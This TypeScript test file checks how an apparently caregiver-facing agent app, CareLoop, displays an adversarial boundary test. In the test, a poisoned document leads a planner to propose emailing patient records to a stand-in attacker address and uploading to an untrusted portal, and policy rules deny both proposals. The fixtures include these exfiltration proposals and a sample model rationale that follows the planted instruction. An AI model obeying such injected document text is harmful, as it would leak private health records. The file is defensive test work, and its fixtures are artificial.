import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { render, screen, waitFor } from "@testing-library/react";
import { MemoryRouter } from "react-router-dom";
import App from "@/app/App";
import type { CaseCard, CaseDetail, CaseSections, TimelineEventView } from "@/services/backend";
import { SUPPLIED_PROPOSAL_RATIONALE } from "@/services/presentation";
import { adversarialProofFor } from "@/services/realApi";

/* The deterministic boundary test, as a person sees it.
 *
 * The claim this file defends is not "a refusal appears" — the product could render that from
 * anything. It is that **every word on the screen comes from the case's own audit trail**, and that
 * the framing note appears exactly where CareLoop really supplied the proposal and nowhere else.
 *
 * That second half is the one worth being careful about. A realistic poisoned-document run where a
 * *real* planner proposes the same attacker address produces a case that looks identical in every
 * respect a screen can see — same tool, same argument, same reason code, same rule. The only thing
 * that separates them is the rationale CareLoop wrote, which is why that is what the note keys on
 * and why `renders nothing over a model-authored proposal` below is the load-bearing test.
 *
 * The phrase-level sweep over what the copy may *say* lives in `tests/test_adversarial_copy.py`.
 */

const ATTACKER = "records-intake@claims-continuity-partners.example";

let seq = 0;
let version = 0;

function entry(kind: string, payload: Record<string, unknown> = {}): TimelineEventView {
  seq += 1;
  return { seq, at: "2026-08-25T11:00:00+00:00", kind, actor: "system", summary: kind.toLowerCase(), payload };
}

/** The five proposals and five refusals the shipped fixture really produces, in order. */
function adversarialTimeline(over: { rationale?: string } = {}): TimelineEventView[] {
  const rationale = over.rationale ?? SUPPLIED_PROPOSAL_RATIONALE;
  return [
    entry("PLAN_PROPOSED", {
      tool_name: "send_email",
      rationale,
      args: { to: ATTACKER, subject: "Referral letter", body: "Records attached." }
    }),
    entry("POLICY_DENY", {
      tool_name: "send_email",
      verdict: "DENY",
      reason_code: "DESTINATION_NOT_TRUSTED",
      matched_rule_id: "deny-email-to-untrusted-recipient"
    }),
    entry("PLAN_PROPOSED", {
      tool_name: "upload_document",
      rationale,
      args: { portal_id: "PORTAL-MG-TRANSFER", document_id: "doc-0002-continuity-notice" }
    }),
    entry("POLICY_DENY", {
      tool_name: "upload_document",
      verdict: "DENY",
      reason_code: "DESTINATION_NOT_TRUSTED",
      matched_rule_id: "deny-upload-to-untrusted-portal"
    }),
    entry("MANUAL_HANDOFF_REQUIRED", { reason_code: "NO_SAFE_ACTION_AVAILABLE" })
  ];
}

function card(over: Partial<CaseCard> = {}): CaseCard {
  return {
    case_id: "demo-adversarial",
    state: "AWAITING_HUMAN",
    section: "needs_you",
    summary: "continuity of care notice",
    version: (version += 1),
    created_at: "2026-08-25T10:00:00+00:00",
    updated_at: "2026-08-25T11:00:00+00:00",
    failure_reason: null,
    fact_count: 2,
    action_count: 0,
    decision: null,
    ...over
  };
}

function detailOf(base: CaseCard, timeline: TimelineEventView[], actions: unknown[] = []): CaseDetail {
  return {
    case_id: base.case_id,
    state: base.state,
    section: base.section,
    version: base.version,
    event_id: "evt-0005-continuity-notice-only",
    summary: base.summary,
    created_at: base.created_at,
    updated_at: base.updated_at,
    failure_reason: base.failure_reason,
    decision: base.decision,
    facts: [],
    approvals: [],
    actions: actions as CaseDetail["actions"],
    timeline
  } as CaseDetail;
}

function serve(cards: CaseCard[], details: Record<string, CaseDetail>): void {
  const sections: CaseSections = {
    needs_you: cards.filter((c) => c.section === "needs_you"),
    working: cards.filter((c) => c.section === "working"),
    completed: cards.filter((c) => c.section === "completed")
  };
  vi.stubGlobal(
    "fetch",
    vi.fn(async (url: string, init?: RequestInit) => {
      if (url.endsWith("/api/sessions")) return new Response("", { status: 404 });
      if (init?.method === "POST") return new Response("", { status: 202 });
      if (url.endsWith("/api/cases")) return new Response(JSON.stringify(sections), { status: 200 });
      if (url.startsWith("/api/cases/")) {
        const found = details[decodeURIComponent(url.split("/")[3])];
        return found ? new Response(JSON.stringify(found), { status: 200 }) : new Response("", { status: 404 });
      }
      return new Response("", { status: 404 });
    })
  );
}

function showCase(timeline: TimelineEventView[], actions: unknown[] = []) {
  const base = card();
  serve([base], { "demo-adversarial": detailOf(base, timeline, actions) });
  return render(
    <MemoryRouter initialEntries={["/case/demo-adversarial"]}>
      <App />
    </MemoryRouter>
  );
}

beforeEach(() => {
  seq = 0;
});

afterEach(() => {
  vi.unstubAllGlobals();
});

/* ------------------------------------------------------------------ */

describe("the framing note appears only where CareLoop really supplied the proposal", () => {
  it("renders over a case whose trail carries CareLoop's own supplied-proposal rationale", async () => {
    showCase(adversarialTimeline());

    expect(await screen.findByLabelText("Adversarial test")).toBeTruthy();
    expect(screen.getByText(/deliberately supplies the dangerous proposal/i)).toBeTruthy();
  });

  it("renders nothing over a model-authored proposal of the very same action", async () => {
    /* The load-bearing one. Same tool, same attacker address, same reason code, same rule — this is
       exactly what the realistic scenario produces when a real planner takes the bait, and a note
       claiming CareLoop supplied it would be false there. */
    const { container } = showCase(adversarialTimeline({ rationale: "the notice asks me to forward the records" }));

    await waitFor(() => expect(screen.getAllByText(/send an email/i).length).toBeGreaterThan(0));
    expect(container.querySelector('[aria-label="Adversarial test"]')).toBeNull();
  });

  it("renders nothing when the backend sent no timeline at all", async () => {
    const { container } = showCase([]);

    await waitFor(() => expect(screen.getByText(/boundary test/i)).toBeTruthy());
    expect(container.querySelector('[aria-label="Adversarial test"]')).toBeNull();
  });
});

describe("the refusal on screen comes from the backend", () => {
  it("shows the reason code and the matched rule the policy engine recorded", async () => {
    showCase(adversarialTimeline());

    expect(await screen.findByText("DESTINATION_NOT_TRUSTED · deny-email-to-untrusted-recipient")).toBeTruthy();
  });

  it("shows the attacker destination the proposal actually named", async () => {
    showCase(adversarialTimeline());

    expect(await screen.findByText(new RegExp(ATTACKER.replace(/[.@]/g, "\\$&"), "i"))).toBeTruthy();
  });

  it("invents no refusal when the trail holds no denial", async () => {
    /* Mutant A as a test: a frontend that rendered the refusal unconditionally would pass the two
       tests above and fail this one. */
    const proposalOnly = [adversarialTimeline()[0]];
    const { container } = showCase(proposalOnly);

    await waitFor(() => expect(screen.getByText(/next step/i)).toBeTruthy());
    expect(container.querySelector('[aria-label="Adversarial test"]')).toBeNull();
    expect(screen.queryByText(/DESTINATION_NOT_TRUSTED/)).toBeNull();
  });
});

describe("the zero-effect surface claims only what the projection proves", () => {
  it("shows the recorded-action count the backend reported", async () => {
    showCase(adversarialTimeline());

    const note = await screen.findByLabelText("Adversarial test");
    expect(note.textContent).toContain("EXTERNAL ACTIONS PERFORMED");
    expect(note.textContent).toContain("0");
    expect(note.textContent).toMatch(/No action was prepared and none was recorded/i);
  });

  it("makes no claim about outside systems the browser cannot observe", async () => {
    /* Binding correction 2. The browser receives the case, not the clinic's request log, so a line
       counting provider calls would be asserting something this page cannot see. The stronger
       internal statement is proven in `tests/test_adversarial_demo.py`, which can observe it. */
    const note = (showCase(adversarialTimeline()), await screen.findByLabelText("Adversarial test"));

    expect(note.textContent).not.toMatch(/outside systems? contacted/i);
    expect(note.textContent).not.toMatch(/provider calls?/i);
    expect(note.textContent).not.toMatch(/0 requests?/i);
  });

  it("disappears entirely rather than lying when an action was recorded", () => {
    /* Mutant D as a test. If an `ActionRecord` somehow existed on a case this claims nothing
       happened on, the honest behaviour is to show nothing — never to show "0" beside a record. */
    const base = card();
    const withAction = detailOf(base, adversarialTimeline(), [{ idempotency_key: "k" }]);

    expect(adversarialProofFor(withAction)).toBeNull();
  });

  it("disappears when the trail shows an attempt was prepared", () => {
    const base = card();
    const prepared = detailOf(base, [
      ...adversarialTimeline(),
      entry("ACTION_PREPARED", { tool_name: "send_email", idempotency_key: "k" })
    ]);

    expect(adversarialProofFor(prepared)).toBeNull();
  });
});

describe("the boundary link joins the refusal to the standing promise", () => {
  it("points at the capability card for the tool that was refused", async () => {
    showCase(adversarialTimeline());

    const link = await screen.findByRole("link", { name: /why this boundary exists/i });
    expect(link.getAttribute("href")).toBe("/trust#send_email");
  });
});

describe("the note says who wrote the proposal, and does not overclaim", () => {
  it("never attributes the proposal to a model", async () => {
    showCase(adversarialTimeline());
    const note = await screen.findByLabelText("Adversarial test");

    for (const claim of [/the model tried/i, /the ai\b/i, /bedrock/i, /took the bait/i, /was tricked/i]) {
      expect(note.textContent).not.toMatch(claim);
    }
  });

  it("explains that no approval was ever put to the caregiver", async () => {
    showCase(adversarialTimeline());
    const note = await screen.findByLabelText("Adversarial test");

    expect(note.textContent).toMatch(/did not ask you to approve/i);
  });

  it("offers no approval control for the refused action", async () => {
    showCase(adversarialTimeline());
    await screen.findByLabelText("Adversarial test");

    expect(screen.queryByRole("button", { name: /^approve$/i })).toBeNull();
  });
});
